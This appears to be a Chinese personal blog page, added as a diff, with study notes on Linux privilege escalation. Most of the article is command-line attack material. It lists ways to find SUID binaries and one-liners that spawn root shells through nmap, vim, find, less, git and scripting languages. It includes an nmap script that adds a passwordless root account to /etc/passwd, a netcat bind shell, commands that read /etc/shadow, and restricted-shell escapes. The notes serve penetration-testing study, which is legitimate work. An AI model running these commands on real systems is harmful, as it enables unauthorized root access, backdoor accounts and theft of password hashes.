@@ -1,0 +1,575 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/avatar.png">
+  <link rel="icon" type="image/png" href="/img/avatar.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="alanlitl">
+  <meta name="keywords" content="">
+  <title>Linux提权 - alanlitl-blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.5.3/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.1.2/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"alanlitl.github.io","root":"/","version":"1.8.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"copy_btn":true,"image_zoom":{"enable":true},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>alanlitl</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner intro-2" id="background" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="Linux提权">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2020-11-22 17:33" pubdate>
+        2020年11月22日 下午
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      928 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      13
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">Linux提权</h1>
+            
+            <div class="markdown-body">
+              <h1 id="SUID提权"><a href="#SUID提权" class="headerlink" title="SUID提权"></a>SUID提权</h1><h2 id="SUID-GUID-Stickybit"><a href="#SUID-GUID-Stickybit" class="headerlink" title="SUID GUID Stickybit"></a>SUID GUID Stickybit</h2><p>suid  4 ,  sgid 2 , Stickybit(粘滞位)  1</p>
+<p>Umask: root的umask为0022 ,第一位是上一排提到的, 所以创建文件时就是777-022=755, 文件就是 755-111=644 除去x(执行权)</p>
+<p>Stickybit(粘滞位)</p>
+<pre><code class="hljs gcode">修饰文件夹  文件只有自己和root用户可以修改
+如/tmp目录 所以用户都可创建修改自己文件, 但无法修改其他用户文件<span class="hljs-comment">(无论是否同一个组)</span></code></pre>
+
+<p>SGID?</p>
+<pre><code class="hljs erlang-repl">用于目录，在该目录下建立的所有文件和目录，属组都继承该目录的属组，且该组内其他成员修改目录内的文件时，其属主和属组都不改变!!  
+chmod g+s 目录
+当修改文件两个用户是other(other和组内成员)时会改变所属主(所属组不变)</code></pre>
+
+<p>suid有啥用?</p>
+<p>普通用户连/etc/shadow的查看权都没有, 但是要修改密码怎么办, 就是利用passwd的suid, 让passwd以root身份执行 赋予s权限需要本身具有x权限</p>
+<p>chmod  4755  前面的4就是SUID</p>
+<blockquote>
+<p>SUID只对可执行文件有效</p>
+<p>调用者对该文件有执行权</p>
+<p>文件执行过程中 拥有文件所有者权限, 权限仅在执行过程中有效</p>
+</blockquote>
+<p>例子 :</p>
+<pre><code class="hljs gradle">赋予<span class="hljs-keyword">find</span>文件s权限
+sudo chmod u+s <span class="hljs-regexp">/usr/</span>bin/<span class="hljs-keyword">find</span>  赋予此权限需要root
+<span class="hljs-keyword">find</span> passwd -exec cat <span class="hljs-regexp">/etc/</span>shadow \;  普通用户也可查看<span class="hljs-regexp">/etc/</span>shadow文件了
+
+sudo chmod u-s <span class="hljs-regexp">/usr/</span>bin/<span class="hljs-keyword">find</span>  去除s权限
+<span class="hljs-keyword">find</span> passwd -exec cat <span class="hljs-regexp">/etc/</span>shadow \;提示权限不够了</code></pre>
+
+<h2 id="找到SUID文件"><a href="#找到SUID文件" class="headerlink" title="找到SUID文件"></a>找到SUID文件</h2><pre><code class="hljs routeros"><span class="hljs-builtin-name">find</span> / -perm <span class="hljs-attribute">-u</span>=s -type f 2&gt;/dev/<span class="hljs-literal">null</span>
+<span class="hljs-builtin-name">find</span> / -user root -perm -4000 -<span class="hljs-builtin-name">print</span> 2&gt;/dev/<span class="hljs-literal">null</span>
+<span class="hljs-builtin-name">find</span> / -user root -perm -4000 -exec ls -ldb &#123;&#125; ;</code></pre>
+
+<p>-perm用法</p>
+<pre><code class="hljs dos"><span class="hljs-built_in">find</span> -perm <span class="hljs-built_in">mode</span>(<span class="hljs-number">0777</span>)  严格匹配, 不足前面自动添<span class="hljs-number">0</span>
+<span class="hljs-built_in">find</span> -perm -<span class="hljs-built_in">mode</span>(xxxx) 将数字转换为二进制, <span class="hljs-number">1</span>则必须匹配,<span class="hljs-number">0</span>则随意(满足要求即可)
+<span class="hljs-built_in">find</span> -perm +<span class="hljs-built_in">mode</span>(xxxx) 与-差别就是只需匹配一个权限位的<span class="hljs-number">1</span>即可(满足其中一个要求即可)</code></pre>
+
+<h2 id="一般可以利用的文件"><a href="#一般可以利用的文件" class="headerlink" title="一般可以利用的文件"></a>一般可以利用的文件</h2><pre><code class="hljs dos">Nmap
+Vim
+<span class="hljs-built_in">find</span>
+Bash
+<span class="hljs-built_in">More</span>
+Less
+Nano
+cp
+git
+wget</code></pre>
+
+<h3 id="namp"><a href="#namp" class="headerlink" title="namp"></a>namp</h3><pre><code class="hljs livecodeserver">在namp <span class="hljs-number">2.02</span>至<span class="hljs-number">5.21</span> 拥有交互<span class="hljs-built_in">shell</span>
+nmap -v
+namp <span class="hljs-comment">--interactive  开启交互模式</span>
+或者通过metaaploit开启
+exploit/unix/<span class="hljs-built_in">local</span>/setuid_nmap</code></pre>
+
+<h4 id="其他版本"><a href="#其他版本" class="headerlink" title="其他版本"></a>其他版本</h4><p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/linux-suid-privilege-escalation.html">https://www.leavesongs.com/PENETRATION/linux-suid-privilege-escalation.html</a></p>
+<p>利用nes脚本执行</p>
+<pre><code class="hljs livecodeserver">创建一个nes脚本
+<span class="hljs-keyword">a</span>.nes
+os.execute(<span class="hljs-string">&quot;/bin/bash&quot;</span>)
+执行
+namp <span class="hljs-comment">--script=a.nes</span>
+但是可能不会成功
+方法二
+<span class="hljs-keyword">a</span>.nes
+
+<span class="hljs-built_in">local</span> <span class="hljs-built_in">file</span> = io.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/etc/passwd&quot;</span>, <span class="hljs-string">&quot;a&quot;</span>)
+<span class="hljs-built_in">file</span>:<span class="hljs-built_in">write</span>(<span class="hljs-string">&quot;root2::0:0::/root:/bin/bash\n&quot;</span>)
+<span class="hljs-built_in">file</span>:<span class="hljs-built_in">close</span>()
+
+nmap <span class="hljs-comment">--script=a.nes</span>
+su root2  切换到root用户了</code></pre>
+
+
+
+<h3 id="vim"><a href="#vim" class="headerlink" title="vim"></a>vim</h3><pre><code class="hljs dockerfile">vim.tiny /etc/shadow  可以读取所有文件
+
+开启<span class="hljs-keyword">shell</span>
+<span class="bash">vim.tiny</span>
+<span class="hljs-comment"># Press ESC key</span>
+:set <span class="hljs-keyword">shell</span><span class="bash">=/bin/sh</span>
+:<span class="hljs-keyword">shell</span></code></pre>
+
+<h3 id="find"><a href="#find" class="headerlink" title="find"></a>find</h3><pre><code class="hljs routeros"><span class="hljs-builtin-name">find</span> passwd -exec <span class="hljs-string">&#x27;/bin/sh&#x27;</span> \;
+或者
+<span class="hljs-builtin-name">find</span> pentestlab -exec netcat -lvp 端口 -e /bin/sh \;
+netcat<span class="hljs-built_in"> ip </span>端口</code></pre>
+
+<h3 id="bash"><a href="#bash" class="headerlink" title="bash"></a>bash</h3><pre><code class="hljs ebnf"><span class="hljs-attribute">bash -p</span></code></pre>
+
+<h3 id="less-more"><a href="#less-more" class="headerlink" title="less/more"></a>less/more</h3><pre><code class="hljs awk">less <span class="hljs-regexp">/etc/</span>passwd(<span class="hljs-regexp">/etc/</span>shadow)
+进入后输入  !<span class="hljs-regexp">/bin/</span>sh</code></pre>
+
+<h3 id="git"><a href="#git" class="headerlink" title="git"></a>git</h3><pre><code class="hljs arcade">git help config 或者git -p help
+输入!<span class="hljs-regexp">/bin/</span>sh或者!<span class="hljs-regexp">/bin/</span>bash</code></pre>
+
+<h3 id="wget"><a href="#wget" class="headerlink" title="wget"></a>wget</h3><p>利用wget下载添加有自定义root账户的passwd文件到<code>/etc/passwd</code></p>
+<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p><a target="_blank" rel="noopener" href="https://gtfobins.github.io/#+suid">https://gtfobins.github.io/#+suid</a></p>
+<h1 id="受限shell突破"><a href="#受限shell突破" class="headerlink" title="受限shell突破"></a>受限shell突破</h1><p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/system/188989.html">https://www.freebuf.com/articles/system/188989.html</a></p>
+<h3 id=""><a href="#" class="headerlink" title="/"></a>/</h3><pre><code class="hljs awk">直接利用
+<span class="hljs-regexp">/bin/</span>sh
+<span class="hljs-regexp">/bin/</span>bash
+<span class="hljs-regexp">/bin/</span>dash</code></pre>
+
+<h3 id="cp"><a href="#cp" class="headerlink" title="cp"></a>cp</h3><pre><code class="hljs awk">将shell文件移到用户目录然后执行
+cp <span class="hljs-regexp">/bin/</span>bash ubash
+cp <span class="hljs-regexp">/bin/</span>sh ush</code></pre>
+
+<h3 id="ftp-gdb-man-git-vim-vi-more-less"><a href="#ftp-gdb-man-git-vim-vi-more-less" class="headerlink" title="ftp gdb man git vim/vi more/less"></a>ftp gdb man git vim/vi more/less</h3><pre><code class="hljs arcade">ftp
+ftp &gt; !<span class="hljs-regexp">/bin/</span>bash</code></pre>
+
+<pre><code class="hljs arcade">gdb
+gdb &gt; !<span class="hljs-regexp">/bin/</span>sh</code></pre>
+
+<pre><code class="hljs stata"><span class="hljs-keyword">man</span> <span class="hljs-keyword">ls</span>
+!/bin/<span class="hljs-keyword">sh</span></code></pre>
+
+<pre><code class="hljs sql">git <span class="hljs-keyword">help</span> <span class="hljs-keyword">status</span>
+!/<span class="hljs-keyword">bin</span>/sh</code></pre>
+
+<pre><code class="hljs vim"><span class="hljs-keyword">vim</span>/<span class="hljs-keyword">vi</span>
+:!/bin/<span class="hljs-keyword">sh</span></code></pre>
+
+<pre><code class="hljs erlang-repl">more/less
+!<span class="hljs-string">&#x27;sh&#x27;</span></code></pre>
+
+<h3 id="pinfo"><a href="#pinfo" class="headerlink" title="pinfo"></a>pinfo</h3><pre><code class="hljs diff">pinfo ls
+<span class="hljs-addition">!</span>
+执行命令</code></pre>
+
+<h2 id="set-shell"><a href="#set-shell" class="headerlink" title="set shell"></a>set shell</h2><p>查看环境变量</p>
+<pre><code class="hljs routeros"><span class="hljs-builtin-name">export</span> -p</code></pre>
+
+<p>如果为-rx则我们无法写入</p>
+<pre><code class="hljs routeros">在vim/vi中设置shell
+:<span class="hljs-builtin-name">set</span> <span class="hljs-attribute">shell</span>=/bin/sh
+:shell
+或者在现有shell修改环境变量
+<span class="hljs-builtin-name">export</span> <span class="hljs-attribute">PATH</span>=<span class="hljs-variable">$PATH</span>:/bin</code></pre>
+
+<h2 id="编程语言提权"><a href="#编程语言提权" class="headerlink" title="编程语言提权"></a>编程语言提权</h2><p>python</p>
+<pre><code class="hljs pf">python -c &#x27;import <span class="hljs-keyword">os</span>;<span class="hljs-keyword">os</span>.system(<span class="hljs-string">&quot;/bin/sh&quot;</span>)&#x27;</code></pre>
+
+<p>php：</p>
+<pre><code class="hljs abnf">php -a then exec(<span class="hljs-string">&quot;sh -i&quot;</span>)<span class="hljs-comment">;</span></code></pre>
+
+<p>perl：</p>
+<pre><code class="hljs ada">perl -e <span class="hljs-symbol">&#x27;exec</span> <span class="hljs-string">&quot;/bin/sh&quot;</span>;&#x27;</code></pre>
+
+<p>lua：</p>
+<pre><code class="hljs lua"><span class="hljs-built_in">os</span>.<span class="hljs-built_in">execute</span>(<span class="hljs-string">&#x27;/bin/sh&#x27;</span>).</code></pre>
+
+<p>ruby：</p>
+<pre><code class="hljs bash"><span class="hljs-built_in">exec</span> <span class="hljs-string">&quot;/bin/sh&quot;</span></code></pre>
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                
+              </div>
+              
+              
+                <div class="post-prevnext row">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2020/11/22/phpmyadmin%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/">
+                        <span class="hidden-mobile">phpmyadmin漏洞利用</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+<!-- SCRIPTS -->
+
+  <script  src="https://cdn.staticfile.org/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":200})
+    NProgress.start()
+    document.addEventListener('DOMContentLoaded', function() {
+      window.NProgress && window.NProgress.inc();
+    })
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.staticfile.org/jquery/3.5.1/jquery.min.js" ></script>
+<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.5.3/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.staticfile.org/tocbot/4.12.0/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.staticfile.org/anchor-js/4.3.0/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>
+
+
+
+
+
+  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    (function () {
+      var path = "/local-search.xml";
+      var inputArea = document.querySelector("#local-search-input");
+      inputArea.onclick = function () {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+        this.onclick = null
+      }
+    })()
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+
+</body>
+</html>
